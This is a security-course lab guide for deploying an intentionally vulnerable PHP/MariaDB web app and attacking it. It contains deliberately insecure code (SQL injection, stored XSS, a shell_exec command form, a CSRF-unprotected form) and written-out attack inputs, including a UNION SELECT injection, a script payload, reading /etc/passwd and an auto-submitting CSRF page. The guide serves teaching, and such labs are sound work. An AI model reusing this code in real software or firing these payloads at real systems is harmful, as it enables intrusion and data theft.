This setup includes vulnerabilities like **CSRF**, **Broken Access Control**, **Advanced SQL Injection with UNION SELECT**, **Persistent XSS**, **Remote Code Execution (RCE)**, and **Privilege Escalation** through improper file permissions.

---

### **Advanced Vulnerable Web Application**

**Objective**: 
Students will create and interact with a vulnerable web application hosted on a Google Cloud instance. They will:
1. Deploy a realistic website with intentional vulnerabilities.
2. Attack these vulnerabilities to understand their risks.
3. Implement and observe countermeasures.

---

### **1. Environment Setup**

#### **1.1 Prerequisites**
- Set up a Google Cloud instance with **Debian** or **Ubuntu**.
- Install the required software:
  ```bash
  sudo apt update
  sudo apt install apache2 php php-mysqli mariadb-server mariadb-client -y
  sudo systemctl start apache2
  sudo systemctl enable apache2
  sudo systemctl start mariadb
  sudo systemctl enable mariadb
  ```
- Create a directory for the PHP application:
  ```bash
  sudo mkdir /var/www/html/vulnerable-app
  sudo chown -R $USER:$USER /var/www/html/vulnerable-app
  cd /var/www/html/vulnerable-app
  ```

#### **1.2 Database Setup**
- Set up MariaDB:
  ```bash
  sudo mysql -u root
  ```
- Execute the following SQL:
  ```sql
  CREATE DATABASE vulnerable_app;
  CREATE USER 'vulnerable_user'@'localhost' IDENTIFIED BY 'password123';
  GRANT ALL PRIVILEGES ON vulnerable_app.* TO 'vulnerable_user'@'localhost';
  FLUSH PRIVILEGES;
  USE vulnerable_app;

  CREATE TABLE users (
      id INT AUTO_INCREMENT PRIMARY KEY,
      username VARCHAR(50) NOT NULL,
      password VARCHAR(255) NOT NULL,
      role VARCHAR(20) DEFAULT 'user'
  );

  CREATE TABLE messages (
      id INT AUTO_INCREMENT PRIMARY KEY,
      user_id INT NOT NULL,
      message TEXT NOT NULL,
      FOREIGN KEY (user_id) REFERENCES users(id)
  );

  INSERT INTO users (username, password, role) VALUES 
  ('admin', 'adminpass', 'admin'), 
  ('guest', 'guestpass', 'user');
  ```

---

### **2. Vulnerable Application Code**

#### **2.1 Advanced SQL Injection with UNION SELECT**
**Filename: `login.php`**
```php
<?php
$conn = new mysqli("localhost", "vulnerable_user", "password123", "vulnerable_app");

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Vulnerable Query
    $query = "SELECT id, username, role FROM users WHERE username = '$username' AND password = '$password'";
    $result = $conn->query($query);

    if ($result->num_rows > 0) {
        $user = $result->fetch_assoc();
        echo "<h1>Welcome, " . htmlspecialchars($user['username']) . "!</h1>";
        echo "<p>Role: " . htmlspecialchars($user['role']) . "</p>";
    } else {
        echo "<h1>Login Failed!</h1>";
    }
}
?>
<form method="POST">
    <label>Username:</label><br>
    <input type="text" name="username"><br>
    <label>Password:</label><br>
    <input type="password" name="password"><br>
    <button type="submit">Login</button>
</form>
```

---

#### **2.2 Persistent XSS**
**Filename: `post_message.php`**
```php
<?php
$conn = new mysqli("localhost", "vulnerable_user", "password123", "vulnerable_app");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $user_id = $_POST['user_id'];
    $message = $_POST['message'];

    // Vulnerable Insert Query
    $query = "INSERT INTO messages (user_id, message) VALUES ('$user_id', '$message')";
    if ($conn->query($query)) {
        echo "<h1>Message Posted!</h1>";
    } else {
        echo "<h1>Error: " . $conn->error . "</h1>";
    }
}
?>
<form method="POST">
    <input type="hidden" name="user_id" value="1">
    <label>Message:</label><br>
    <textarea name="message"></textarea><br>
    <button type="submit">Post</button>
</form>
```

**Display Messages**
**Filename: `view_messages.php`**
```php
<?php
$conn = new mysqli("localhost", "vulnerable_user", "password123", "vulnerable_app");

$query = "SELECT * FROM messages";
$result = $conn->query($query);

echo "<h1>Message Board</h1>";
while ($row = $result->fetch_assoc()) {
    echo "<p>" . $row['message'] . "</p>";
}
?>
```

---

#### **2.3 Remote Code Execution (RCE)**
**Filename: `rce.php`**
```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $cmd = $_POST['command'];

    // Vulnerable Command Execution
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>
<form method="POST">
    <label>Enter Command:</label><br>
    <input type="text" name="command"><br>
    <button type="submit">Execute</button>
</form>
```

---

#### **2.4 Cross-Site Request Forgery (CSRF)**
**Filename: `csrf_form.php`**
```php
<form action="update_profile.php" method="POST">
    <label>New Email:</label>
    <input type="email" name="email">
    <button type="submit">Update</button>
</form>
```

**Filename: `update_profile.php`**
```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST['email'];
    // Simulate updating email without CSRF token
    echo "<h1>Email updated to: $email</h1>";
}
?>
```

---

### **3. Real-World Scenarios**

#### **Scenario 1: Exploiting SQL Injection**
- Input the following into the login form to dump user data:
  - Username: `' OR 1=1 UNION SELECT 1, username, password FROM users--`
  - Password: Any value

#### **Scenario 2: Persistent XSS**
- Post a malicious script on the message board:
  - `<script>alert('Persistent XSS');</script>`
- View the message board and observe the execution.

#### **Scenario 3: RCE**
- Execute server-side commands, such as:
  - `ls` (list files)
  - `cat /etc/passwd` (view sensitive files)

#### **Scenario 4: CSRF**
- Craft a malicious HTML file to exploit CSRF:
  ```html
  <form action="http://your-server-ip/update_profile.php" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
  </form>
  <script>document.forms[0].submit();</script>
  ```

---

### **4. Observations and Report**
Students should document:
1. How vulnerabilities were exploited.
2. Screenshots of successful attacks.
3. Recommendations for countermeasures:
   - Prepared Statements for SQL Injection.
   - Escaping User Input for XSS.
   - CSRF Tokens for CSRF Prevention.
   - Shell Command Escaping for RCE.

---

This setup provides a **comprehensive real-world environment** for ethical hacking demonstrations, challenging students to think critically and develop advanced security skills.